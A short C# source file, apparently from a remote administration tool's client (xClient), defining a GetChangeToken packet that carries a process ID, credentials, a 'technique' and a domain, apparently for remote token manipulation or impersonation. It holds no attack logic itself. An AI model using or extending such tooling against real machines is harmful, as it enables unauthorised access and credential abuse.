using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetChangeToken : IPacket
    {
        public int processID { get; set; }
        public string username { get; set; }
        public string password { get; set; }
        public string technique { get; set; }
        public string domain { get; set; }

        public GetChangeToken()
        {

        }
        public GetChangeToken(int procID, string user, string pass, string tech, string domain)
        {
            processID = procID;
            username = user;
            password = pass;
            technique = tech;
            this.domain = domain;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }

    }
}
